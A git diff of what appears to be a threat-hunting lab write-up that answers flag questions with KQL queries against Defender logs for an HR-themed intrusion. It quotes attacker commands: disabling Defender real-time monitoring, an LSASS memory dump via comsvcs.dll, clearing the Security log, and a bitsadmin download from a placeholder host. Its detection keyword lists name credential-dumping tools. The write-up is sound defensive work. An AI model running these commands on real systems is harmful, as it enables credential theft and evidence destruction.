@@ -116,7 +116,7 @@ DeviceProcessEvents
 
 🧠 **Thought process:** The query I used was the same as the first flag, because I could already see from the results from flag 1, that the attacker used "powershell.exe" -Command "Get-LocalUser | ForEach-Object { \"User: $($_.Name) | Enabled: $($_.Enabled)\" }" command to get the lay of the land of the local accounts.
 
-<img width="600" src="https://github.com/user-attachments/assets/626eb342-4e88-4a56-a848-5a65a189910d"/>
+<img width="800" src="https://github.com/user-attachments/assets/626eb342-4e88-4a56-a848-5a65a189910d"/>
 
 **Answer: SHA256 = 9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3**
 
@@ -146,513 +146,492 @@ DeviceProcessEvents
 | project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
 ```
 
-🧠 **Thought process:** The query is still the same, because it gives all the information needed to provide the answer for 1st, 2nd and 3rd flag
+🧠 **Thought process:** The query is still the same, because it gives all the information needed to provide the answer for the 1st, 2nd, and 3rd flag.
 
-
-<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>
 
 **Answer: "powershell.exe" net localgroup Administrators**
 
 ---
 
-## 🟩 Flag 4 – Last Manual Access to File
+## 🟩 Flag 4 – Active Session Discovery
 
 **Objective:**
 
-Track last read of sensitive document.
+Reveal which sessions are currently active for potential masking.
 
 **What to Hunt:**
 
-Last file open timestamp.
+Might be session-enumeration commands.
 
 **Thought:**
 
-Late-stage access usually precedes exfiltration — timeline alignment matters.
+By riding along existing sessions, attackers can blend in and avoid spawning suspicious user contexts.
 
 
- 🕵️ **Identify the last instance of the file access**
+ 🕵️ **Provide the value of the program tied to this activity**
 
-Query used: Same as flag 3
+Query used:
+```
+DeviceProcessEvents
+| where DeviceName == "nathan-iel-vm"
+| where FileName == "powershell.exe" or InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
+```
 
 
-🧠 **Thought process:** From the results seen in flag 3, I got the Timestamp of the last file access.
+🧠 **Thought process:** The query stays the same. This time around, I was getting a little lost, but then I googled what qwinsta means from the previous results, and I found the answer to flag 4.
 
-
-<img width="600" src="https://github.com/user-attachments/assets/ec955588-e3cd-493a-8655-1ecc08fae16e"/>
-
-**Answer: 2025-06-16T06:12:28.2856483Z**
+**Answer: qwinsta.exe**
 
 ---
 
-## 🟩 Flag 5 – LOLBin Usage: bitsadmin
+## 🟩 Flag 5 – Defender Configuration Recon
 
 **Objective:**
 
-Identify stealth download via native tools.
+Expose tampering or inspection of AV defenses, disguised under HR activity.
 
 **What to Hunt:**
 
-bitsadmin.exe with file transfer URL.
+Can be PowerShell related activity.
 
 **Thought:**
 
-Abusing trusted binaries helps attackers blend in — keep an eye on LOLBins.
+Disabling protection under the guise of internal tooling is a hallmark of insider abuse.
 
+**Side Note: 1/6**
 
- 🕵️ **Provide the command value associated with the initial exploit**
+union
+
+ 🕵️ **What was the command value used to execute?**
 
 Query used:
 
 ```
 DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
-| where FileName contains "bitsadmin.exe"
-| order by Timestamp asc
+| where DeviceName == "nathan-iel-vm"
+| where FileName == "powershell.exe" or InitiatingProcessFileName == "powershell.exe"
+| project Timestamp, ProcessCommandLine, FileName, SHA256,InitiatingProcessFileName, AccountName, ProcessCreationTime
 ```
 
-🧠 **Thought process:** I simply followed the hint and I got a straight answer in the logs.
+🧠 **Thought process:** Query will stay the same. I spotted this command upon reviewing the logs in flag 1 already.
 
 <img width="250" src="https://github.com/user-attachments/assets/fd161361-da91-49b7-b3b6-10a559c48896"/>
 
-**Answer: "bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe**
+**Answer: ""powershell.exe" -Command "Set-MpPreference -DisableRealtimeMonitoring $true"**
 
 ---
 
-## 🟩 Flag 6 – Suspicious Payload Deployment
+## 🟩 Flag 6 – Defender Policy Modification
 
 **Objective:**
 
-Identify dropped executable payloads that do not align with baseline software.
+Validate if core system protection settings were modified.
 
 **What to Hunt:**
 
-New files placed in Temp or uncommon locations, especially with misleading names.
+Policy or configuration changes that affect baseline defensive posture.
 
 **Thought:**
 
-Payloads must land before they run. Watch Temp folders for staging signs.
+Turning down the shield is always a red flag.
 
-**Hint:**
-
-1. Book of financial accounts
-
- 🕵️ **Identify the suspicious program**
-
-Query used:
-
-```
-DeviceFileEvents
-| where DeviceName == "michaelvm"
-| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
-| where FileName endswith ".exe"
-| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\", "\\Users\\Public\\")
-| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp asc
-```
-
-🧠 **Thought process:** I sorted the results by file name, that way it was easy to sift through the results and find the odd one out.
-
-<img width="400" src="https://github.com/user-attachments/assets/8f2dce56-934b-4bd4-95b2-32f67088554c"/>
-
-**Answer: ledger_viewer.exe**
-
----
-
-## 🟩 Flag 7 – HTA Abuse via LOLBin
-
-**Objective:**
-
-Detect execution of HTML Application files using trusted Windows tools.
-
-**What to Hunt:**
-
-Execution via `mshta.exe` pointing to local HTA scripts.
-
-**Thought:**
-
-HTA-based execution is a social engineering favorite — it leverages trust and native execution.
-
- 🕵️ **Provide the value of the command associated with the exploit**
-
-Query used:
-
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where Timestamp between (datetime(2025-06-15T00:00:00Z) .. datetime(2025-06-17T00:00:00Z))
-| where FileName =~ "mshta.exe"
-| where ProcessCommandLine has ".hta"
-| project Timestamp, ProcessCommandLine, InitiatingProcessFileName, FolderPath, SHA256
-| order by Timestamp asc
-```
-
-🧠 **Thought process:** The hints were good enough for me to find the results directly, where file name was mshta.exe and command line having .hta extensions
-
-<img width="600" src="https://github.com/user-attachments/assets/a0c40640-28f7-45bc-9314-2a502cfef238"/>
-
-**Answer: "mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta**
-
----
-
-## 🟩 Flag 8 – ADS Execution Attempt
-
-**Objective:**
-
-Track if attackers stored payloads in Alternate Data Streams (ADS).
-
-**What to Hunt:**
-
-DLLs hidden in common file types like `.docx` with `:hidden.dll` behavior.
-
-**Thought:**
-
-ADS hides in plain sight — it’s a classic LOLBin trick to store malware where few would look.
-
-**Hint:**
-
-1. Capitalist
-
- 🕵️ **Provide the SHA1 value associated**
-
-Query used:
-
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where Timestamp between (datetime(2025-06-15) .. datetime(2025-06-19))
-| where InitiatingProcessCommandLine has ":"
-| where InitiatingProcessCommandLine has ".dll"
-| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, SHA1
-| order by Timestamp desc
-```
-
-🧠 **Thought process:** I filtered for the command line having ":" and ".dll" in it, according to the hint. The compattelrunner.exe sounds like Capitalist, so I figured it's the answer which it was. Upon further inspection, I could see that Write-Host 'Final result: 1' command was run before the compattelrunner.exe scan. It's faking the result of a scan — potentially to mimic a real system check or mislead defenders. Then, the second command does the actual .inf scan. This staged behavior is often seen in malware to print fake result (decoy), actually scan system or possibly drop drivers or persistence tools.
-
-<img width="400" src="https://github.com/user-attachments/assets/97c83a1b-8bcc-4b15-ab39-c49512c362cd"/>
-
-**Answer: 801262e122db6a2e758962896f260b55bbd0136a**
-
----
-
-## 🟩 Flag 9 – Registry Persistence Confirmation
-
-**Objective:**
-
-Confirm that persistence was achieved via registry autorun keys.
-
-**What to Hunt:**
-
-Registry path and value that re-executes the attack script.
-
-**Thought:**
-
-Once in the registry, an attacker can survive reboots — making this a prime persistence marker.
-
- 🕵️ **Provide the value of the registry tied to this particular exploit**
+ 🕵️ **Provide the name of the registry value**
 
 Query used:
 
 ```
 DeviceRegistryEvents
-| where DeviceName == "michaelvm"
-| where RegistryKey endswith @"CurrentVersion\Run"
-     or RegistryKey endswith @"CurrentVersion\RunOnce"
-| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
-| order by Timestamp desc
+| where DeviceName == "nathan-iel-vm"
+| where ActionType == "RegistryValueSet"
+| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
 ```
 
-🧠 **Thought process:** I just looked for commands Run or RunOnce within the RegistryKey where these persistence methods usually are, and it gave me the answer.
+🧠 **Thought process:** The question itself asked for the registry value, so I immediately went looking into modified registry values and ordering them by registry value name. I then came across the answer.
 
-<img width="800" src="https://github.com/user-attachments/assets/d6ceceae-d855-4dc6-a1ce-4f929e5e9dca"/>
+<img width="800" src="https://github.com/user-attachments/assets/1d759b75-6108-46cc-8890-d87aa87b09f2"/>
 
-**Answer: HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run**
+**Answer: DisableAntiSpyware**
 
 ---
 
-## 🟩 Flag 10 – Scheduled Task Execution
+## 🟩 Flag 7 – Access to Credential-Rich Memory Space
 
 **Objective:**
 
-Validate the scheduled task that launches the payload.
+Identify if the attacker dumped memory content from a sensitive process.
 
 **What to Hunt:**
 
-Name of the task tied to the attack’s execution flow.
+Uncommon use of system utilities interacting with protected memory.
 
 **Thought:**
 
-Even if stealthy, scheduled tasks leave clear creation trails. Look for unfamiliar task names.
+The path to credentials often runs through memory — if you can reach it, you own it.
 
- 🕵️ **What is the name of the scheduled task created**
+**Side Note: 2/6**
+(DeviceFileEvents | where FileName =~ "ConsoleHost_history.txt" and ActionType == "FileDeleted")
+
+
+ 🕵️ **What was the HR related file name associated with this tactic?**
 
 Query used:
 
 ```
 DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where FileName =~ "schtasks.exe" and ProcessCommandLine has "/create"
-| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName
+| where DeviceName == "nathan-iel-vm"
+| where FileName in~ ("rundll32.exe","procdump.exe","procdump64.exe","werfault.exe")
+| where ProcessCommandLine has_any ("lsass","comsvcs.dll","MiniDump")
+| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
 | order by Timestamp asc
 ```
 
-🧠 **Thought process:** I looked for scheduled tasks and found what I was looking for and more.
+🧠 **Thought process:** The query was made with the help of chat gpt, because I wasn't sure which processes create dumps, but after seeing the results, I could have just as well used the query from the first 5 flags, because the answer was also there.
 
-<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>
+<img width="600" src="https://github.com/user-attachments/assets/e5dd2028-8251-4fac-ad9b-1b67e5052518"/>
 
-**Answer: MarketHarvestJob**
-
----
-
-## 🟩 Flag 11 – Target of Lateral Movement
-
-**Objective:**
-
-Identify the remote machine the attacker pivoted to next.
-
-**What to Hunt:**
-
-Remote system name embedded in command-line activity.
-
-**Thought:**
-
-The attack is expanding. Recognizing lateral targets is key to containment.
-
- 🕵️ **Drop the next compromised machine name**
-
-Query used: same as flag 10
-
-🧠 **Thought process:** In the previous flag I spotted lateral movement to a different machine as a scheduled task. I also noticed it at flag 2 where I looked into the SHA256.
-
-<img width="800" src="https://github.com/user-attachments/assets/7af9ea77-36a4-48c3-8bfc-17522bb10838"/>
-
-**Answer: centralsrvr**
+**Answer: HRConfig.json**
 
 ---
 
-## 🟩 Flag 12 – Lateral Move Timestamp
+## 🟩 Flag 8 – File Inspection of Dumped Artifacts
 
 **Objective:**
 
-Pinpoint the exact time of lateral move to the second system.
+Detect whether memory dump contents were reviewed post-collection.
 
 **What to Hunt:**
 
-Execution timestamps of commands aimed at the new host.
+Signs of local tools accessing sensitive or unusually named files.
 
 **Thought:**
 
-Timing matters — it allows us to reconstruct the attack window on the second host.
-
- 🕵️ **When was the last lateral execution?**
-
-Query used:
-
-```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine has "C2.ps1"
-```
-
-🧠 **Thought process:** From the previous flag, I gathered enough evidence to jump directly to the lateral movement execution with the above query.
-
-<img width="250" src="https://github.com/user-attachments/assets/67306d9b-279b-45a5-83a1-df6a47c916c1"/>
-
-**Answer: 2025-06-17T03:00:49.525038Z**
-
----
-
-## 🟩 Flag 13 – Sensitive File Access
-
-**Objective:**
-
-Reveal which specific document the attacker was after.
-
-**What to Hunt:**
-
-Verify if the attackers were after a similar file
-
-**Thought:**
-
-The goal is rarely just control — it’s the data. Identifying what they wanted is vital.
+Dumping isn’t the end — verification is essential.
 
 **Hint:**
 
 1. Utilize previous findings
 
- 🕵️ **Provide the standard hash value associated with the file**
+ 🕵️ **Provide the value of the associated command**
+
+Query used:
+
+```
+DeviceProcessEvents
+| where DeviceName == "nathan-iel-vm"
+| where ProcessCommandLine has "HRConfig.json"
+| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
+| order by Timestamp asc
+```
+
+🧠 **Thought process:** I looked for the file that was dumped with the above query, but it could also have been seen with the same query as the first 5 flags, which is where I actually took the screenshot.
+
+<img width="400" src="https://github.com/user-attachments/assets/34d36a4a-ea80-4483-9c1e-159369581b29"/>
+
+**Answer: "notepad.exe" C:\HRTools\HRConfig.json**
+
+---
+
+## 🟩 Flag 9 – Outbound Communication Test
+
+**Objective:**
+
+Catch network activity establishing contact outside the environment.
+
+**What to Hunt:**
+
+Lightweight outbound requests to uncommon destinations.
+
+**Thought:**
+
+Before exfiltration, there’s always a ping — even if it’s disguised as routine.
+
+**Side Note: 3/6**
+
+(DeviceFileEvents | where FileName =~ "EmptySysmonConfig.xml")
+
+ 🕵️ **What was the TLD of the unusual outbound connection?**
+
+Query used:
+
+```
+DeviceNetworkEvents
+| where DeviceName == "nathan-iel-vm"
+| distinct RemoteUrl
+```
+
+🧠 **Thought process:** I looked for unique remote URLs and found the pipedream.net, which is known for data exfil.
+
+<img width="1000" src="https://github.com/user-attachments/assets/5e96688d-33d4-456c-88e0-b79b938bd0c5"/>
+
+**Answer: .net**
+
+---
+
+## 🟩 Flag 10 – Covert Data Transfer
+
+**Objective:**
+
+Uncover evidence of internal data leaving the environment.
+
+**What to Hunt:**
+
+Activity that hints at transformation or movement of local HR data.
+
+**Thought:**
+
+Staging the data is quiet. Sending it out makes noise — if you know where to listen.
+
+ 🕵️ **Identify the ping of the last unusual outbound connection attempt**
+
+Query used:
+
+```
+DeviceNetworkEvents
+| where DeviceName == "nathan-iel-vm"
+| where RemoteUrl endswith ".net" or RemoteUrl contains ".net"
+| order by Timestamp desc
+```
+
+🧠 **Thought process:** I wasn't sure what I was looking for. Am I looking for the time of the last ping that was made to an external URL? Was it the last connection? But in the end, it was the IP address of the pipedream website which is now different due to new logs. I'm assuming it might be 3.234.58.20.
+
+**Answer: 52.54.13.125**
+
+---
+
+## 🟩 Flag 11 – Persistence via Local Scripting
+
+**Objective:**
+
+Verify if unauthorized persistence was established via legacy tooling.
+
+**What to Hunt:**
+
+Use of startup configurations tied to non-standard executables.
+
+**Thought:**
+
+A quiet script in the right location can make a backdoor look like a business tool.
+
+**Side Note: 4/6**
+
+(DeviceProcessEvents | where FileName =~ "Sysmon64.exe" and ProcessCommandLine has "-c")
+
+ 🕵️ **Provide the file name tied to the registry value**
+
+Query used:
+
+```
+DeviceRegistryEvents
+| where DeviceName == "nathan-iel-vm"
+| where ActionType == "RegistryValueSet"
+| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData
+```
+
+🧠 **Thought process:** I used the same query as for flag 6 and ordered the logs by registry value name again. That is where I saw the HRToolTracker and the registry value data which has the name of the file.
+
+<img width="800" src="https://github.com/user-attachments/assets/dceb3328-7555-435f-9528-c3b9a4876a2b"/>
+
+**Answer: OnboardTracker.ps1**
+
+---
+
+## 🟩 Flag 12 – Targeted File Reuse / Access
+
+**Objective:**
+
+Surface the document that stood out in the attack sequence.
+
+**What to Hunt:**
+
+Repeated or anomalous access to personnel files.
+
+**Thought:**
+
+The file that draws the most interest often holds the motive.
+
+**Format:**
+
+Abcd Efgh
+
+ 🕵️ **What is the name of the personnel file that was repeatedly accessed?**
+
+Query used:
+
+```
+DeviceEvents
+| where DeviceName == "nathan-iel-vm"
+| where FileName != ""
+```
+
+🧠 **Thought process:** The query doesn't seem like much but the empty fields in the FileName column helped a lot, so when I order by File name I could see that the file of Carlos Tanaka was accessed the most.
+
+<img width="250" src="https://github.com/user-attachments/assets/e1efafef-83ea-4315-a2f7-ca036d7b9bcc"/>
+
+**Answer: Carlos Tanaka**
+
+---
+
+## 🟩 Flag 13 – Candidate List Manipulation
+
+**Objective:**
+
+Trace tampering with promotion-related data.
+
+**What to Hunt:**
+
+Unexpected modifications to structured HR records.
+
+**Thought:**
+
+Whether tampering or staging — file changes precede extraction.
+
+**Hint:**
+
+1. Utilize previous findings
+2. File is duplicated in other folder(s)
+
+**Side Note: 5/6**
+
+(DeviceRegistryEvents | where RegistryKey has @"SOFTWARE\CorpHRChaos")
+
+ 🕵️ **Identify the first instance where the file in question is modified and drop the corresponding SHA1 value of it**
 
 Query used:
 
 ```
 DeviceFileEvents
-| where DeviceName == "centralsrvr"
-| where FileName == "QuarterlyCryptoHoldings.docx"
-| project Timestamp, FileName, SHA256, FolderPath, InitiatingProcessFileName
+| where DeviceName == "nathan-iel-vm"
+| where FileName =~ "PromotionCandidates.csv"
+| where ActionType == "FileModified"
 ```
 
-🧠 **Thought process:** I assumed, according to the hint, that the file they were after was the same one as in flag 3, so I jumped directly to that file and got the SHA256 of the QuarterlyCryptoHoldings.docx file.
+🧠 **Thought process:** According to the previous findings and the promotion-related data I immediately assumed it was the Hash of the promotionCandidates.csv, which ended up being the correct assumption
 
-<img width="400" src="https://github.com/user-attachments/assets/58ec4895-d925-4468-b5b2-9c5109d7ffac"/>
-
-**Answer: b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98**
+**Answer: SHA1 = 65a5195e9a36b6ce73fdb40d744e0a97f0aa1d34**
 
 ---
 
-## 🟩 Flag 14 – Data Exfiltration Attempt
+## 🟩 Flag 14 – D Audit Trail Disruption
 
 **Objective:**
 
-Validate outbound activity by hashing the process involved.
+Detect attempts to impair system forensics.
 
 **What to Hunt:**
 
-Process hash related to exfiltration to common outbound services.
+Operations aimed at removing historical system activity.
 
 **Thought:**
 
-Exfil isn’t just about the connection — process lineage shows who initiated the theft.
+The first thing to go when a crime’s committed? The cameras.
 
- 🕵️ **Provide the associated MD5 value of the exploit**
+**Hint:**
+
+1. "ab"
+
+ 🕵️ **Identify when the first attempt at clearing the trail was done**
 
 Query used:
 
 ```
-DeviceNetworkEvents
-| where DeviceName == "centralsrvr"
-| where RemoteIPType == "Public"
-| where RemoteUrl != ""
-| where InitiatingProcessCommandLine contains "exfiltrate"
-| project Timestamp, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessMD5
+DeviceProcessEvents
+| where DeviceName == "nathan-iel-vm"
+| where FileName in~ ("wevtutil.exe","powershell.exe")
+| where ProcessCommandLine has_any ("wevtutil", "wevtutil.exe cl", "Clear-EventLog", "Remove-EventLog")
+| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, AccountName
+| order by Timestamp asc
 ```
 
-🧠 **Thought process:** This flag was a little bit of a challenge, but I sifted through a lot of files throughout the hunt, where I found some exfiltratedata.ps1 executables, but was not sure if it was there for just noise or to throw me off. I played around with the KQL to lower the amount of logs shown and found that the above-mentioned executable was actually the one responsible for exfiltration.
+🧠 **Thought process:** I saw all the logs from my previous findings, so I narrowed it down to wevutil.exe cl and some others that AI helped with just in case I missed some. The right answer was indeed the command "wevtutil.exe" cl Security, well the specific time, depending on the new or old logs.
 
-<img width="600" src="https://github.com/user-attachments/assets/cb9dd4b7-2e56-47c9-b6fb-09e902e1fcf6"/>
+<img width="600" src="https://github.com/user-attachments/assets/c8faa800-1b77-4600-af6d-c292b95d846e"/>
 
-**Answer: 2e5a8590cf6848968fc23de3fa1e25f1**
+**Answer: 2025-07-19T05:38:55.6800388Z**
 
 ---
 
-## 🟩 Flag 15 – Destination of Exfiltration
+## 🟩 Flag 15 – Final Cleanup and Exit Prep
 
 **Objective:**
 
-Identify final IP address used for data exfiltration.
+Capture the combination of anti-forensics actions signaling attacker exit.
 
 **What to Hunt:**
 
-Remote IPs of known unauthorized cloud services.
+Artifact deletions, security tool misconfigurations, and trace removals.
 
 **Thought:**
 
-Knowing where data went informs response and informs IR/containment scope.
+Every digital intruder knows — clean up before you leave or you’re already caught.
 
- 🕵️ **Identify the IP of the last outbound connection attempt**
+**Side Note: 6/6**
 
-Query used:
-
-```
-DeviceNetworkEvents
-| where DeviceName == "centralsrvr"
-| where RemoteIPType == "Public"
-| where RemoteUrl != ""
-| where RemoteUrl in~ (
-   "drive.google.com",
-   "dropbox.com",
-   "www.dropbox.com",
-   "pastebin.com",
-   "dw8wjz3q0i4gj.cloudfront.net",
-   "o.ss2.us"
-)
-| project Timestamp, DeviceName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, InitiatingProcessSHA256
 | sort by Timestamp desc
-```
 
-🧠 **Thought process:** I filtered for the remote URLs that I noticed could be a third-party unauthorized cloud service, and I only had 4 IPs to choose from, and in the end, it was the IP of pastebin.com
 
-<img width="600" src="https://github.com/user-attachments/assets/4db9f414-56df-4e73-b30c-cd5d664bae8d"/>
-
-**Answer: 104.22.69.199**
-
----
-
-## 🟩 Flag Flag 16 – PowerShell Downgrade Detection
-
-**Objective:**
-
-Spot PowerShell version manipulation to avoid logging.
-
-**What to Hunt:**
-
-`-Version 2` execution flag in process command lines.
-
-**Thought:**
-
-This signals AMSI evasion — it’s a red flag tactic to bypass modern defenses.
-
- 🕵️ **When was a downgrade attempt executed?**
+ 🕵️ **Identify when the last associated attempt occurred**
 
 Query used:
 
 ```
+let device = "nathan-iel-vm";
+
+// Processes that clear traces
+let ProcAF =
 DeviceProcessEvents
-| where DeviceName == "centralsrvr"
-| where ProcessCommandLine contains "-Version 2"
+| where DeviceName == device
+| where
+  (FileName =~ "wevtutil.exe" and ProcessCommandLine has " cl ") or
+  (FileName =~ "powershell.exe" and ProcessCommandLine has_any (
+      "Remove-Item",
+      "Clear-EventLog",
+      "ConsoleHost_history.txt",
+      @"\Recent", @"\Prefetch",
+      @"Windows Defender\\Scans\\History",
+      @"HKLM:\\SOFTWARE\\CorpHRChaos"
+  )) or
+  (FileName =~ "Sysmon64.exe" and ProcessCommandLine has " -c")
+| project Timestamp, Source="Proc", FileName, ProcessCommandLine;
+
+// File artifacts (PS history, Defender history, empty Sysmon cfg)
+let FileAF =
+DeviceFileEvents
+| where DeviceName == device
+| where (FileName =~ "ConsoleHost_history.txt" and ActionType == "FileDeleted")
+   or (tostring(FolderPath) has @"\Windows Defender\Scans\History" and ActionType == "FileDeleted")
+   or (FileName =~ "EmptySysmonConfig.xml" and ActionType in ("FileCreated","FileModified"))
+| project Timestamp, Source="File", FileName, FolderPath, ActionType;
+
+// Registry artifacts (range-specific cleanup key)
+let RegAF =
+DeviceRegistryEvents
+| where DeviceName == device
+| where RegistryKey has @"SOFTWARE\CorpHRChaos"
+| project Timestamp, Source="Reg", RegistryKey, RegistryValueName, RegistryValueData;
+
+union ProcAF, FileAF, RegAF
 ```
 
-🧠 **Thought process:** This was a pretty straightforward flag since the hints gave away what to look for. Once I queried the -Version 2 in the process command line, I had my answer.
+🧠 **Thought process:** ChatGPT wrote the query as I wasn't sure what I was looking for, BUT it gave me the correct answer immediately. According to the new logs the answer is different, the time obviouslly, but the file as well. In previous logs it was EmptySysmonConfig.xml but in the new logs i'm seeing ConsoleHost_history.txt.
 
-<img width="300" src="https://github.com/user-attachments/assets/a501e571-2329-48cf-8df4-edbbb27855ef"/>
-
-**Answer: 2025-06-18T10:52:59.0847063Z**
-
----
-
-## 🟩 Flag 17 – Log Clearing Attempt
-
-**Objective:**
-
-Catch attacker efforts to cover their tracks.
-
-**What to Hunt:**
-
-Use of `wevtutil cl Security` to clear event logs.
-
-**Thought:**
-
-Cleaning logs shows intent to persist without a trace — it's often one of the final steps before attacker exit.
-
- 🕵️ **Identify the process creation date**
-
-Query used:
-
-```
-DeviceProcessEvents
-| where DeviceName == "centralsrvr"
-| where ProcessCommandLine has_any ("wevtutil", "cl Security")
-```
-
-🧠 **Thought process:** The last flag was, at a glance, very simple, but it had a little twist to it. I found what I was looking for immediately, but I had trouble giving in the right time. The question was set as "identifying the process creation time" and not just a Timestamp. At a glance, these two times look the same, so I always just posted the Timestamp time, but after countless hours of questioning myself, I realized what the question is actually asking for.
-
-<img width="250" src="https://github.com/user-attachments/assets/460a7771-351e-4171-9ef6-dbf9118880ad"/>
-
-**Answer: 2025-06-18T10:52:33.3030998Z**
+**Answer: 2025-07-19T06:18:38.6841044Z**
 
 ---
 
 ## ✅ Conclusion
 
-The attacker leveraged native tools and LOLBins to evade detection, accessed high-value documents, and stealthily exfiltrated them while maintaining persistence. The clean logs indicate deliberate obfuscation and anti-forensic effort.
+The endpoint nathan-iel-vm shows a clear, HR-themed intrusion that relied almost entirely on built-in tooling (LOLBAS).
 
-🛡️ **Recommendations**
+The attacker:
 
-	•	Block LOLBins like bitsadmin, mshta via AppLocker or WDAC
-	•	Enable script block logging and AMSI
-	•	Monitor for PowerShell downgrade attempts (-Version 2)
-	•	Watch for registry changes in autorun paths
-	•	Alert on suspicious scheduled task creation
-	•	Monitor public cloud uploads (e.g. Dropbox, Pastebin)
+	•	Recon & account scoping: whoami /all, net localgroup Administrators, and qwinsta to learn privileges and sessions.
+	•	AV weakening: multiple Set-MpPreference -DisableRealtimeMonitoring $true runs and policy change (DisableAntiSpyware) to lower defenses.
+	•	Credential access: LSASS mini-dump via rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump … saved as C:\HRTools\HRConfig.json, then opened with notepad.exe.
+	•	WData staging & tampering: Created many HR artifacts and modified PromotionCandidates.csv (also duplicated under LegacyAutomation).
+	•	Egress testing & exfil: Outbound beacons to pipedream.net and scripted POST of staged data.
+	•	Persistence: Run-key autostart (HRToolTracker) pointing to OnboardTracker.ps1.
+ 	•	Anti-forensics: Deletion of traces (PS history, Defender history), log clearing via wevtutil cl Security, and final Sysmon neutering by dropping EmptySysmonConfig.xml
 
 
-“Attackers hide in noise. But sometimes, they hide in silence.”
+
